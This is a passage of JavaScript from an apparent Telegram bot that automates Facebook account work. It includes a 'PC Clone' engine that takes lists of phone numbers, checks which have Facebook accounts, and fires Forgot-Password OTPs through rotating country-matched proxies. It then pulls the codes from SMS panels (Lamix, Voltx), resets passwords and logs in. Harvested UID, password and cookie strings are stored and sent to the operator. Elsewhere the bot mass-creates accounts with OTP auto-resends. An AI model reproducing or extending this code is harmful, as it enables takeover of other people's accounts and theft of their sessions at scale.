                autoResendRes = await performAutoOtpResends(finalItem, cfg, userBaseCookie, {
                  rounds: configuredResends,
                  shouldAbort: () => runState.abortRequested,
                  onStep: async (round, totalRounds, stepRes, curItem) => {
                    finalItem = curItem;
                    if (stepRes.ok && !stepRes.alreadyConfirmed) {
                      upsertUserPending(user.id, curItem);
                      appendUserLog(user.id, `+${phone} [${resCountryIso}] Auto OTP Resent (${round}/${totalRounds}) via ${stepRes.via}`);
                      await updateProgress(
                        `🔁 <b>Auto-Resending OTP (${round}/${totalRounds}):</b> <code>+${escapeHtml(phone)}</code> [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                        false
                      );
                    } else if (!stepRes.ok) {
                      appendUserLog(user.id, `+${phone} [${resCountryIso}] Auto OTP Resend ${round}/${totalRounds}: ${stepRes.reason || 'stopped'}`);
                    }
                  },
                });
                if (autoResendRes?.item) finalItem = autoResendRes.item;
              }
            }

            if (autoResendRes?.alreadyConfirmed) {
              const curPend = readUserPending(user.id).filter((p) => p.phone !== phone);
              writeUserPending(user.id, curPend);
              const usersMap = readUsersMap();
              const uRec = usersMap[user.id];
              if (uRec) {
                uRec.usedToday += 1;
                uRec.totalOk += 1;
                uRec.lastActiveAt = Date.now();
                writeUsersMap(usersMap);
              }
              runState.okCount += 1;
              storeUserAccount(user.id, {
                name: res.name,
                phone,
                pass: cfg.password,
                uid: autoResendRes.uid,
                status: 'OK',
                confirmed: true,
                printer: res.printer,
                engine: `${res.engine || 'limited'}+auto-resend`,
                cookies: autoResendRes.cookies,
              });
              const cstr = formatCookieHeader(autoResendRes.cookies || {});
              await sendMessage(
                chatId,
                [
                  `✅ <b>ACCOUNT READY (AUTO-CONFIRMED)</b>`,
                  DIVIDER,
                  `👤 <b>Profile:</b> ${escapeHtml(res.name)} [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                  `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                  `🔑 <b>UID|Pass:</b> <code>${escapeHtml(autoResendRes.uid)}|${escapeHtml(cfg.password)}</code>`,
                  ``,
                  `<blockquote>🍪 <code>${escapeHtml(cstr.slice(0, 260))}${cstr.length > 260 ? '...' : ''}</code></blockquote>`,
                ].join('\n'),
                {
                  inline_keyboard: [
                    [
                      btnOk('📦 View Accounts', 'menu:accounts'),
                      btnNav('⬅️ Main Menu', 'menu:home'),
                    ],
                  ],
                }
              );
            } else {
              if (finalItem) upsertUserPending(user.id, finalItem);
              const usersMap = readUsersMap();
              const uRec = usersMap[user.id];
              if (uRec) {
                uRec.usedToday += 1;
                uRec.totalPending += 1;
                uRec.lastActiveAt = Date.now();
                writeUsersMap(usersMap);
              }
              runState.pendingCount += 1;
              storeUserAccount(user.id, {
                name: res.name,
                phone,
                pass: cfg.password,
                status: res.status,
                confirmed: false,
                printer: res.printer,
                engine: res.engine,
                cookies: finalItem?.cookies || res.cookies,
              });
              const resendDone = Number(finalItem?.resendCount || autoResendRes?.count || 0);
              const stickyHost = finalItem?.proxy
                ? (() => { try { return new URL(finalItem.proxy).hostname; } catch { return 'proxy'; } })()
                : 'Direct';
              await sendMessage(
                chatId,
                [
                  `🔔 <b>OTP / CHECKPOINT REQUIRED</b>`,
                  DIVIDER,
                  `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
                  `🌍 <b>Country:</b> ${escapeHtml(resCountryName)} [<b>${escapeHtml(resCountryIso)}</b>]  •  📌 <b>${escapeHtml(res.status)}</b>`,
                  `🌐 <b>Sticky Proxy:</b> <code>${escapeHtml(stickyHost)}</code> (${escapeHtml(resProxyIso)})  •  🔁 <b>OTP Resent:</b> <code>${resendDone}/${configuredResends}</code>`,
                  `👤 <b>Profile:</b> ${escapeHtml(res.name)}  •  🔑 <b>Pass:</b> <code>${escapeHtml(cfg.password)}</code>`,
                ].join('\n'),
                {
                  inline_keyboard: [
                    [
                      btnOk(`🔑 Enter OTP (+${phone.slice(-6)})`, `otp:enter:${phone}`),
                      btnNav(`🔁 Resend OTP`, `otp:resend:${phone}`),
                    ],
                    [
                      btnNav(`🔎 Check Login`, `otp:check:${phone}`),
                      btnNav('🔐 OTP Queue', 'menu:otp'),
                      btnBad('🗑 Delete', `otp:del:${phone}`),
                    ],
                  ],
                }
              );
            }
          } else {
            const usersMap = readUsersMap();
            const uRec = usersMap[user.id];
            if (uRec) {
              uRec.usedToday += 1;
              uRec.totalFail += 1;
              uRec.lastActiveAt = Date.now();
              writeUsersMap(usersMap);
            }
            runState.failCount += 1;
            storeUserAccount(user.id, {
              name: res.name,
              phone,
              pass: cfg.password,
              status: res.status,
              confirmed: false,
              printer: res.printer,
              engine: res.engine,
              cookies: res.cookies,
              err: res.err,
            });
            const reason = `${res.status}: ${res.err || 'unknown'}`;
            failureDetails.push(`+${phone} [${resCountryIso}] → ${reason}`);
            if (finalQueue.length <= 5) {
              await sendMessage(
                chatId,
                [
                  `❌ <b>ATTEMPT FAILED [${escapeHtml(res.status)}]</b>`,
                  DIVIDER,
                  `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code> [${escapeHtml(resCountryName)} • <b>${escapeHtml(resCountryIso)}</b>]`,
                  `<blockquote>💬 ${escapeHtml(res.err || 'unknown')}</blockquote>`,
                ].join('\n')
              );
            }
          }

          await updateProgress(`📱 <b>Last Finished:</b> <code>+${escapeHtml(phone)}</code>`);

          if (nextIdx < finalQueue.length && !runState.abortRequested && delaySecBase > 0) {
            let delaySec = delaySecBase;
            const isBatchBreak = cfg.batch > 0 && (i + 1) % cfg.batch === 0;
            if (isBatchBreak) delaySec *= 2;
            const endAt = Date.now() + delaySec * 1000;
            while (Date.now() < endAt && !runState.abortRequested) {
              await new Promise((r) => setTimeout(r, 150));
            }
          }
        }
      };

      const workerCount = Math.min(threads, finalQueue.length);
      await Promise.all(Array.from({ length: workerCount }, () => worker()));

      runState.running = false;
      runState.currentNumber = null;
      pushBotLog(`User ${user.id} finished batch: OK=${runState.okCount}, OTP=${runState.pendingCount}, FAIL=${runState.failCount}`);
      appendUserLog(user.id, `BATCH FINISHED: OK=${runState.okCount}, OTP=${runState.pendingCount}, FAIL=${runState.failCount}`);

      const errPreview =
        failureDetails.length > 0 && finalQueue.length > 5
          ? `\n\n<b>Recent Failure Reasons:</b>\n<blockquote><code>${escapeHtml(failureDetails.slice(-6).join('\n'))}</code></blockquote>`
          : '';

      const summaryTxt = [
        runState.abortRequested ? `🛑 <b>BATCH STOPPED</b>` : `🏁 <b>BATCH COMPLETED</b>`,
        DIVIDER,
        `📊 <b>Processed:</b> <code>${renderProgressBar(runState.completed, runState.total)}</code> (<code>${runState.completed}/${runState.total}</code>)`,
        `✅ <b>Ready Accounts:</b> <code>${runState.okCount}</code>`,
        `🔐 <b>Pending OTP:</b> <code>${runState.pendingCount}</code>`,
        `❌ <b>Failed/Other:</b> <code>${runState.failCount}</code>${errPreview}`,
      ].join('\n');
      if (progressMsgId) {
        await editMessage(chatId, progressMsgId, summaryTxt, {
          inline_keyboard: [
            [
              btnNav('🔐 OTP Queue', 'menu:otp'),
              btnOk('📦 Accounts', 'menu:accounts'),
              btnNav('📜 Logs', 'menu:logs'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        });
      }
    })();
  }

  async function handleOtpReply(chatId, uid, phone, code) {
    const items = readUserPending(uid);
    const idx = items.findIndex((p) => p.phone === phone);
    if (idx === -1) {
      promptSessions.delete(uid);
      await sendMessage(chatId, `⚠️ Session for <code>+${escapeHtml(phone)}</code> is no longer in queue.`, {
        inline_keyboard: [[btnNav('🔐 OTP Queue', 'menu:otp'), btnNav('⬅️ Main Menu', 'menu:home')]],
      });
      return;
    }

    const item = { ...items[idx] };
    const cfg = readUserConfig(uid);
    const userCookie = readUserCookies(uid);
    await sendMessage(chatId, `⏳ Submitting code for <code>+${escapeHtml(phone)}</code>...`);

    const result = item.flow === 'recovery'
      ? await submitRecoveryOtpAndLogin(item, code.trim(), item.pass || cfg.password, cfg)
      : await performOtpConfirm(item, code.trim(), cfg, userCookie);
    if (result.status === 'OK') {
      promptSessions.delete(uid);
      const finalPass = result.pass || item.pass || cfg.password || '';
      storeUserAccount(uid, {
        name: item.name,
        phone: item.phone,
        pass: finalPass,
        uid: result.uid,
        status: 'OK',
        confirmed: true,
        engine: item.flow === 'recovery' ? 'PC_CLONE_RECOVERY' : undefined,
        cookies: result.cookies,
      });
      items.splice(idx, 1);
      writeUserPending(uid, items);
      const usersMap = readUsersMap();
      if (usersMap[uid]) {
        usersMap[uid].totalOk += 1;
        writeUsersMap(usersMap);
      }
      pushBotLog(`User ${uid} verified OTP for +${phone} -> UID ${result.uid}`);
      appendUserLog(uid, `OTP VERIFIED +${phone} -> UID ${result.uid}`);
      const cstr = formatCookieHeader(result.cookies || {});
      await sendMessage(
        chatId,
        [
          `✅ <b>OTP VERIFIED &amp; LOGGED IN!</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(item.phone)}</code>`,
          `🆔 <b>UID:</b> <code>${escapeHtml(result.uid)}</code>  •  🔑 <b>Pass:</b> <code>${escapeHtml(finalPass)}</code>`,
          `📋 <b>UID|Pass|Cookies:</b>`,
          `<blockquote><code>${escapeHtml(result.uid)}|${escapeHtml(finalPass)}|${escapeHtml(cstr.slice(0, 400))}${cstr.length > 400 ? '...' : ''}</code></blockquote>`,
        ].join('\n'),
        {
          inline_keyboard: [
            [
              btnOk('🔐 Remaining OTPs', 'menu:otp'),
              btnNav('📦 Accounts Vault', 'menu:accounts'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        }
      );
      return;
    }

    if (result.status === 'RETRY') {
      items[idx] = result.item;
      writeUserPending(uid, items);
      appendUserLog(uid, `OTP RETRY step +${phone} (${result.item.confirm_url || ''})`);
      await sendMessage(
        chatId,
        [
          `🔄 <b>NEXT STEP REQUIRED</b>`,
          DIVIDER,
          `📱 <b>Number:</b> <code>+${escapeHtml(phone)}</code>`,
          `🔗 <b>URL:</b> <code>${escapeHtml(result.item.confirm_url || '')}</code>`,
          ``,
          `<blockquote>Reply with the next code or checkpoint response:</blockquote>`,
        ].join('\n'),
        { inline_keyboard: [[btnBad('❌ Cancel OTP Input', 'menu:otp')]] }
      );
      return;
    }

    if (result.status === 'WRONG') {
      appendUserLog(uid, `OTP WRONG +${phone}`);
      await sendMessage(
        chatId,
        `❌ <b>Incorrect or Expired OTP</b> for <code>+${escapeHtml(phone)}</code>.\nReply again with the right code:`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'menu:otp')]] }
      );
      return;
    }

    promptSessions.delete(uid);
    appendUserLog(uid, `OTP FAIL +${phone}: ${result.err}`);
    await sendMessage(
      chatId,
      `❌ <b>Verification Failed</b> for <code>+${escapeHtml(phone)}</code>\n<blockquote>${escapeHtml(result.err)}</blockquote>`,
      { inline_keyboard: [[btnNav('🔐 Back to OTP Queue', 'menu:otp'), btnNav('⬅️ Main Menu', 'menu:home')]] }
    );
  }

  async function handleNormalizeText(chatId, uid, rawText) {
    const cfg = readUserConfig(uid);
    const doneSet = readUserDone(uid);
    const seen = new Set();
    const valid = [];
    const invalid = [];
    const skipped = [];

    for (const line of rawText.split(/[\r\n,\s]+/)) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const n = normNumber(trimmed, cfg.cc);
      if (!n) {
        invalid.push(trimmed);
        continue;
      }
      if (seen.has(n)) continue;
      seen.add(n);
      if (doneSet.has(n)) skipped.push(n);
      valid.push(n);
    }

    normalizedCache.set(uid, valid);
    normalizedFreeCache.delete(uid);
    const isoCounts = {};
    for (const n of valid) {
      const det = detectCountryFromNumber(`+${n}`, cfg.cc);
      const tag = det?.iso && det.iso !== '??' ? det.iso : 'AUTO';
      isoCounts[tag] = (isoCounts[tag] || 0) + 1;
    }
    const isoSummary = Object.entries(isoCounts).map(([k, v]) => `${k}:${v}`).join(' • ');
    const preview = valid
      .slice(0, 12)
      .map((n) => {
        const det = detectCountryFromNumber(`+${n}`, cfg.cc);
        return `+${n} [${det?.iso || '??'}]`;
      })
      .join('\n');
    await sendMessage(
      chatId,
      [
        `🔢 <b>NUMBER NORMALIZER RESULT (Fallback CC: +${escapeHtml(cfg.cc)})</b>`,
        DIVIDER,
        `✅ <b>Valid Unique:</b> <code>${valid.length}</code>${isoSummary ? ` (${escapeHtml(isoSummary)})` : ''}`,
        `⚠️ <b>Already in Done:</b> <code>${skipped.length}</code>`,
        `❌ <b>Invalid Skipped:</b> <code>${invalid.length}</code>`,
        preview ? `\n<b>Preview:</b>\n<blockquote><code>${escapeHtml(preview)}</code>${valid.length > 12 ? `\n... +${valid.length - 12} more` : ''}</blockquote>` : '',
      ].filter(Boolean).join('\n'),
      {
        inline_keyboard: [
          ...(valid.length > 0
            ? [
                [
                  btnOk(`▶️ Start Batch (${valid.length})`, 'norm:run_cached'),
                  btnNav(`🔍 GQL Check (${Math.min(valid.length, 1000)})`, 'norm:gqlcheck'),
                ],
              ]
            : []),
          [
            btnNav('🔢 Check More', 'menu:normalize'),
            btnNav('⬅️ Main Menu', 'menu:home'),
          ],
        ],
      }
    );
  }

  async function renderPcCloneMenu(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const lamixTok = (cfg.lamix_token || process.env.LAMIX_TOKEN || '').trim();
    const resends = Math.max(1, Math.min(10, Number(cfg.pc_otp_resends ?? 3)));
    const links = normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const recPw = cfg.password ? `🟢 <code>${escapeHtml(cfg.password)}</code>` : '🟡 Auto-Generated (<code>FbClone@xxxx</code>)';
    promptSessions.set(uid, { kind: 'awaiting_pc_clone' });
    const linkLines = links.map((u, idx) => `   ${idx + 1}. <code>${escapeHtml(u)}</code>`).join('\n');
    const txt = [
      `💻 <b>PC CLONE &amp; AUTO RECOVERY ENGINE</b>`,
      DIVIDER,
      `🌍 <b>Auto Country + Sticky Proxy:</b> ${cfg.auto_proxy_country !== false ? '🟢 ON (<code>-country-XX</code>)' : '🔴 OFF'}`,
      `🗑 <b>Non-FB / Free Numbers:</b> 🟢 Auto-Delete Immediately`,
      `🔁 <b>Forgot OTP Trigger Rounds:</b> <code>1–${resends}x</code> (checks Lamix after each send)`,
      `📡 <b>Lamix API v1 OTP Panel:</b> ${lamixTok ? '🟢 Configured (Per-Round + 90s Poll)' : '🔴 Not Set (Tap Set Lamix Token)'}`,
      `🔑 <b>Recovery Login Password:</b> ${recPw}`,
      `🔗 <b>Active Recovery Links (${links.length}):</b>\n${linkLines}`,
      `📋 <b>Output Format:</b> <code>UID|Pass|cookies</code> (Live + <code>.txt</code>)`,
      ``,
      `<blockquote>📥 Paste phone numbers below (one per line) <b>OR</b> upload a <code>.txt</code> file to start!</blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk(`🔗 Recovery Links (${links.length})`, 'pc:links'),
          btnOk(`🔁 OTP Repeats (${resends}x)`, 'pc:set_resends'),
        ],
        [
          btnNav(lamixTok ? '🔑 Update Lamix Token' : '🔑 Set Lamix Token', 'pc:set_lamix'),
          btnOk('📡 Sync Lamix OTPs', 'otp:lamix_sync'),
        ],
        [
          btnNav('🔒 Set Recovery Pass', 'set:pw'),
          btnBad('🧼 1-Click Fresh Cookies', 'cookies:fresh_all'),
        ],
        [btnNav('⬅️ Main Menu', 'menu:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderPcCloneLinksMenu(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const active = normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const isSelected = (u) => active.includes(u);
    const presetRowBtns = PC_RECOVERY_PRESETS.map((p) =>
      (isSelected(p.url) ? btnOk(`✅ ${p.label}`, `pc:links_toggle:${p.id}`) : btnNav(`➕ ${p.label}`, `pc:links_toggle:${p.id}`))
    );
    const linkLines = active.map((u, idx) => `${idx + 1}. <code>${escapeHtml(u)}</code>`).join('\n');
    const txt = [
      `🔗 <b>PC CLONE FACEBOOK RECOVERY LINKS</b>`,
      DIVIDER,
      `Bot uses these links in order with your sticky country proxy to send Forgot Password OTP &amp; check Lamix after every round:`,
      ``,
      linkLines,
      ``,
      `<blockquote>Tap any preset below to toggle, or tap <b>Suggest Custom Links</b> to paste one/multiple Facebook URLs.</blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        presetRowBtns.slice(0, 2),
        presetRowBtns.slice(2, 4),
        [presetRowBtns[4], btnOk('📝 Suggest Custom Links', 'pc:links_custom')],
        [btnNav('♻️ Reset Defaults', 'pc:links_reset'), btnNav('⬅️ Back to PC Clone', 'menu:pc_clone')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function runPcCloneBatch(chatId, uid, numbersInput) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const existing = activeRuns.get(uid);
    if (existing?.running) {
      await sendMessage(chatId, '⏳ A batch job is already running for your account. Wait or stop it first.', {
        inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop')]],
      });
      return;
    }

    const userProxies = readUserProxies(uid);
    const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
    const targetList = numbersInput.slice(0, 500);
    if (targetList.length === 0) {
      await sendMessage(chatId, '⚠️ No valid phone numbers provided for PC clone.', {
        inline_keyboard: [[btnNav('⬅️ PC Clone', 'menu:pc_clone')]],
      });
      return;
    }

    const lamixTok = (cfg.lamix_token || process.env.LAMIX_TOKEN || '').trim();
    const { apiKey: voltxKey, baseUrl: voltxBase } = resolveVoltxCreds(uid);
    const otpResendTarget = Math.max(1, Math.min(10, Number(cfg.pc_otp_resends ?? 3)));
    const recoveryLinks = normalizePcRecoveryUrls(cfg.pc_recovery_urls, { fallbackToDefaults: true });
    const runState = {
      running: true,
      abortRequested: false,
      total: targetList.length,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
    };
    activeRuns.set(uid, runState);

    const progRes = await sendMessage(
      chatId,
      [
        `💻 <b>PC CLONE ADVANCED ENGINE (${otpResendTarget}x OTP)</b>`,
        DIVIDER,
        `🚀 Probing <code>0/${targetList.length}</code> numbers via <code>${recoveryLinks.length}</code> FB link(s)...`,
        `🗑 Auto-delete FREE • 🔁 Forgot OTP <code>1-${otpResendTarget}x</code> • 📡 ${lamixTok ? 'Lamix Per-Round Poll ON' : 'OTP Queue Mode'}`,
      ].join('\n'),
      { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] }
    );
    const progMsgId = progRes.ok ? progRes.result?.message_id : null;

    pushBotLog(`User ${uid} started PC Clone batch (${targetList.length} nums, ${otpResendTarget}x OTP, ${recoveryLinks.length} links)`);
    appendUserLog(uid, `PC CLONE STARTED: ${targetList.length} numbers (${otpResendTarget}x forgot OTP)`);

    (async () => {
      const watchMap = new Map();
      const verifiedAccounts = [];
      const seenLamixIds = new Set();
      const seenVoltxIds = new Set();
      const badProxies = new Set();
      let deletedFree = 0;
      let triggeredCount = 0;
      let nextIdx = 0;
      let workersDone = false;

      if (lamixTok) {
        const preL = await fetchLamixMessages(lamixTok, 80);
        if (preL.ok) {
          for (const row of preL.messages) {
            const f = getLamixMsgFields(row);
            if (f.id) seenLamixIds.add(f.id);
          }
        }
      }
      if (voltxKey) {
        const preV = await voltxGetSuccessOtps(voltxBase, voltxKey);
        if (preV.ok) {
          for (const row of preV.otps) {
            if (row.otp_id) seenVoltxIds.add(String(row.otp_id));
          }
        }
      }

      const updatePcProgress = async (statusLine = '', force = false) => {
        if (!progMsgId) return;
        const waitingCnt = Array.from(watchMap.values()).filter((w) => !w.done).length;
        await editMessage(
          chatId,
          progMsgId,
          [
            `💻 <b>PC CLONE ADVANCED ENGINE</b>`,
            DIVIDER,
            statusLine || `📱 <b>Checking:</b> <code>${runState.currentNumber ? '+' + escapeHtml(runState.currentNumber) : 'Processing...'}</code>`,
            `📊 <code>${renderProgressBar(runState.completed, targetList.length)}</code> (<code>${runState.completed}/${targetList.length}</code>)`,
            `✅ Login OK: <code>${verifiedAccounts.length}</code>  •  🔁 OTP Sent: <code>${triggeredCount}</code>  •  ⏳ Wait OTP: <code>${waitingCnt}</code>  •  🗑 Deleted Free: <code>${deletedFree}</code>`,
          ].join('\n'),
          { inline_keyboard: [[btnBad('🛑 Stop Run', 'menu:stop')]] },
          { throttle: true, noRetry: true, minIntervalMs: force ? 1200 : 2500 }
        );
      };

      const completeWatchLogin = async (w, uidFound, passUsed, cookiesFound, codeUsed, viaLabel) => {
        if (!w || w.done) return;
        w.done = true;
        runState.okCount += 1;
        runState.pendingCount = Math.max(0, runState.pendingCount - 1);
        const cstr = formatCookieHeader(cookiesFound || {});
        const recLine = `${uidFound}|${passUsed}|${cstr}`;
        verifiedAccounts.push({ phone: w.phone, uid: uidFound, pass: passUsed, cstr, line: recLine, iso: w.iso });
        storeUserAccount(uid, {
          name: w.name,
          phone: w.phone,
          pass: passUsed,
          uid: uidFound,
          status: 'OK',
          confirmed: true,
          engine: `PC_CLONE_${viaLabel}`,
          cookies: cookiesFound,
        });
        writeUserPending(uid, readUserPending(uid).filter((p) => p.phone !== w.phone));
        const usersMap = readUsersMap();
        if (usersMap[uid]) {
          usersMap[uid].totalOk += 1;
          writeUsersMap(usersMap);
        }
        appendUserLog(uid, `PC CLONE LOGIN OK +${w.phone} -> ${uidFound} (${viaLabel})`);
        await sendMessage(
          chatId,
          [
            `✅ <b>PC CLONE LOGIN SUCCESS (${escapeHtml(viaLabel)})</b>`,
            DIVIDER,
            `📱 <b>Number:</b> <code>+${escapeHtml(w.phone)}</code> [<b>${escapeHtml(w.iso || 'AUTO')}</b>]  •  🔑 <b>OTP:</b> <code>${escapeHtml(codeUsed)}</code>`,
            w.item?.usedEntryUrl ? `🔗 <b>Entry Link:</b> <code>${escapeHtml(w.item.usedEntryUrl)}</code>` : '',
            `📋 <b>UID|Pass|Cookies:</b>`,
            `<blockquote><code>${escapeHtml(recLine.slice(0, 450))}${recLine.length > 450 ? '...' : ''}</code></blockquote>`,
          ]
            .filter(Boolean)
            .join('\n'),
          { inline_keyboard: [[btnOk('📦 Accounts Vault', 'menu:accounts'), btnNav('💻 PC Clone', 'menu:pc_clone')]] }
        );
      };

      const tryCheckOtpAndLoginForWatch = async (w) => {
        if (!w || w.done || w.verifying || (!lamixTok && !voltxKey)) return null;
        w.verifying = true;
        try {
          if (lamixTok) {
            const lRes = await fetchLamixMessages(lamixTok, 80);
            if (lRes.ok && lRes.messages.length > 0) {
              for (const row of lRes.messages) {
                const f = getLamixMsgFields(row);
                if (!f.message || (f.id && seenLamixIds.has(f.id))) continue;
                if (!phoneDigitsMatch(f.number, w.phone)) continue;
                if (f.ts && f.ts < runState.startedAt - 120000) continue;
                if (f.id) seenLamixIds.add(f.id);
                const code = extractFbOtpFromSms(f.message);
                if (!code) continue;
                await updatePcProgress(`📩 <b>Lamix OTP!</b> <code>+${escapeHtml(w.phone)}</code> → <code>${escapeHtml(code)}</code> (Logging in...)`, true);
                const logRes = await submitRecoveryOtpAndLogin({ ...w.item }, code, w.pass, cfg);
                if (logRes.status === 'OK') {
                  await completeWatchLogin(w, logRes.uid, logRes.pass || w.pass, logRes.cookies, code, 'LAMIX');
                  return logRes;
                } else if (logRes.status === 'RETRY') {
                  w.item = logRes.item;
                  upsertUserPending(uid, logRes.item);
                }
              }
            }
          }
          if (voltxKey) {
            const vRes = await voltxGetSuccessOtps(voltxBase, voltxKey);
            if (vRes.ok && vRes.otps.length > 0) {
              for (const row of vRes.otps) {
                const oid = String(row.otp_id || `${row.number}_${row.time}`);
                if (seenVoltxIds.has(oid)) continue;
                if (!phoneDigitsMatch(row.number, w.phone)) continue;
                if (row.time && Number(row.time) < runState.startedAt - 120000) continue;
                seenVoltxIds.add(oid);
                const code = extractFbOtpFromSms(row.message);
                if (!code) continue;
                await updatePcProgress(`📩 <b>Voltx OTP!</b> <code>+${escapeHtml(w.phone)}</code> → <code>${escapeHtml(code)}</code> (Logging in...)`, true);
                const logRes = await submitRecoveryOtpAndLogin({ ...w.item }, code, w.pass, cfg);
                if (logRes.status === 'OK') {
                  await completeWatchLogin(w, logRes.uid, logRes.pass || w.pass, logRes.cookies, code, 'VOLTX');
                  return logRes;
                } else if (logRes.status === 'RETRY') {
                  w.item = logRes.item;
                  upsertUserPending(uid, logRes.item);
                }
              }
            }
          }
        } finally {
          w.verifying = false;
        }
        return null;
      };

      const otpPoller = (async () => {
        if (!lamixTok && !voltxKey) return;
        let deadline = 0;
        while (!runState.abortRequested) {
          const waiting = Array.from(watchMap.values()).filter((w) => !w.done && !w.verifying);
          if (workersDone) {
            if (Array.from(watchMap.values()).every((w) => w.done)) break;
            if (!deadline) deadline = Date.now() + 90000;
            if (Date.now() > deadline) break;
          }
          if (waiting.length > 0) {
            for (const match of waiting) {
              if (runState.abortRequested) break;
              await tryCheckOtpAndLoginForWatch(match);
            }
          }
          await sleepAbort(2200, () => runState.abortRequested);
        }
      })();

      const worker = async (workerOffset) => {
        while (!runState.abortRequested) {
          const i = nextIdx++;
          if (i >= targetList.length) break;
          const num = targetList[i];
          runState.currentNumber = num;
          const numDet = detectCountryFromNumber(`+${num}`, cfg.cc);
          const effCc = (cfg.auto_proxy_country !== false && numDet?.cc) ? numDet.cc : cfg.cc;
          const effIso = (cfg.auto_proxy_country !== false && numDet?.iso && numDet.iso !== '??') ? numDet.iso : getCountryInfo(effCc)[1];
          const effCName = numDet?.name || getCountryInfo(effCc)[0];

          let rawPx = null;
          let px = null;
          if (proxyPool.length > 0 || cfg.proxy) {
            rawPx = proxyPool.length > 0
              ? selectSmartProxy(proxyPool, workerOffset + i, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null)
              : cfg.proxy || null;
            px = adaptProxyForSession(rawPx, {
              iso: effIso,
              autoCountry: cfg.auto_proxy_country !== false,
              refreshSession: true,
            }).url;
          }

          let gql;
          try {
            const gqlPx = cfg.gql_via_direct !== false && !px ? null : px;
            gql = await checkNumberGraphql(`+${num}`, {
              cc: effCc,
              proxy: gqlPx,
              strictProxy: cfg.strict_proxy !== false,
              timeoutMs: 12000,
              shouldAbort: () => runState.abortRequested,
            });
          } catch (err) {
            if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
            gql = { status: 'unknown', nameHint: '', reason: err instanceof Error ? err.message : 'err' };
          }

          if (gql.status === 'free') {
            deletedFree += 1;
            runState.completed += 1;
            appendUserLog(uid, `PC CLONE +${num} [${effIso}] FREE -> auto-deleted`);
            await updatePcProgress(`🗑 <b>Auto-Deleted (No FB):</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]`, i === 0);
            continue;
          }

          if (gql.status === 'taken') {
            const recPass = cfg.password && cfg.password.length >= 6
              ? cfg.password
              : `FbClone@${Math.floor(1000 + Math.random() * 8999)}`;
            const watchEntry = {
              phone: num,
              name: gql.nameHint || `PC Clone ${num.slice(-4)}`,
              pass: recPass,
              iso: effIso,
              startedAt: Date.now(),
              done: false,
              verifying: false,
              item: null,
            };

            let otpRes;
            try {
              otpRes = await triggerForgotPasswordOtp(num, cfg, px, {
                resends: otpResendTarget,
                recoveryUrls: recoveryLinks,
                cc: effCc,
                iso: effIso,
                country: effCName,
                nameHint: watchEntry.name,
                newPass: recPass,
                rawProxy: rawPx,
                shouldAbort: () => runState.abortRequested,
                onAfterOtpSent: async ({ round, totalRounds, otpsSent, usedEntryUrl, item: roundItem }) => {
                  watchEntry.item = roundItem;
                  watchEntry.name = roundItem.name || watchEntry.name;
                  if (!watchMap.has(num)) {
                    triggeredCount += 1;
                    runState.pendingCount += 1;
                    watchMap.set(num, watchEntry);
                  }
                  upsertUserPending(uid, roundItem);
                  await updatePcProgress(
                    `🔁 <b>OTP ${round}/${totalRounds}x:</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]${usedEntryUrl ? ` via <code>${escapeHtml(new URL(usedEntryUrl).hostname)}</code>` : ''} → Checking Lamix...`,
                    false
                  );
                  if (lamixTok || voltxKey) {
                    // Poll Lamix/Voltx ~3.5s right after this OTP send/resend before firing another resend
                    for (let pTry = 0; pTry < 2; pTry++) {
                      if (runState.abortRequested || watchEntry.done) break;
                      const okPoll = await sleepAbort(pTry === 0 ? 1800 : 1700, () => runState.abortRequested);
                      if (!okPoll || watchEntry.done) break;
                      const hit = await tryCheckOtpAndLoginForWatch(watchEntry);
                      if (hit && hit.status === 'OK') {
                        return { stop: true, loginResult: hit };
                      }
                    }
                  }
                  return { stop: Boolean(watchEntry.done) };
                },
              });
            } catch (err) {
              if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
              otpRes = { ok: false, err: err instanceof Error ? err.message : 'Recovery error' };
            }

            if (otpRes.notFound) {
              if (watchMap.has(num)) {
                watchMap.delete(num);
                triggeredCount = Math.max(0, triggeredCount - 1);
                runState.pendingCount = Math.max(0, runState.pendingCount - 1);
              }
              deletedFree += 1;
              runState.completed += 1;
              appendUserLog(uid, `PC CLONE +${num} [${effIso}] recover notFound -> auto-deleted`);
            } else if (otpRes.ok && otpRes.item) {
              watchEntry.item = otpRes.item;
              if (!watchMap.has(num)) {
                triggeredCount += 1;
                runState.pendingCount += 1;
                watchMap.set(num, watchEntry);
              }
              if (!watchEntry.done) {
                upsertUserPending(uid, otpRes.item);
              }
              runState.completed += 1;
              appendUserLog(
                uid,
